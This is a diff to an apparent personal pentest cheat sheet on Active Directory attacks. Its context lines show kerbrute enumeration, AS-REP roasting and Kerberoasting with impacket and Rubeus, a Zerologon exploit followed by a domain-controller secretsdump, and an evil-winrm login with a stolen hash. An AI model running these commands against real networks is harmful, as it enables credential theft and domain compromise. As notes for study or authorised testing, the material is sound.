@@ -3,6 +3,7 @@ KERBRUTE:
 #kerbrute #ad #enum #passwordspray #userenum #kerberos 
 
 Install/Build latest kerbrute:
+
 ```bash
 go install github.com/ropnop/kerbrute@latest
 #or the good old-fashioned
@@ -69,6 +70,7 @@ impacket-GetNPUsers -dc-ip $TARGET_IP -request -outputfile hashes.asreproast $AD
 ```
 
 Or if you got a shell on machine:
+#rubeus 
 
 ```powershell
 Rubeus.exe asreproast /format:hashcat /outfile:C:hashes.txt
@@ -121,7 +123,9 @@ Pre-compiled Windows binaries (Rubeus, Certify …):
 ---
 Kerberoasting:
 ---
-#kerberos #kerberoasting #ad #active-directory #windows 
+#kerberos #kerberoasting #ad #active-directory #windows #spn
+
+The attacker impersonates an account user with a service principal name (SPN) and requests a service-related ticket.
 
 Check if vulnerable accounts are present:
 
@@ -135,6 +139,8 @@ Send request to TGS and extract the hash:
 impacket-GetUserSPNs -dc-ip $TARGET_IP $TARGET_DOMAIN/$USERNAME -request
 ```
 
+#kerberoasting #rubeus
+
 ```powershell
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
@@ -147,10 +153,9 @@ python3.11 cve-2020-1472-exploit.py $NB_NAME $TARGET_IP
 impacket-secretsdump -no-pass -just-dc $NB_NAME\$@$TARGET_IP\
 evil-winrm -u administrator -i $TARGET_IP -H $HASH
 ```
-Overpass the hash attack
+Overpass the hash attack:
 ---
-(when NTLM protocol is disabled):
----
+when NTLM protocol is disabled
 #overpass-the-hash
 
 ```shell
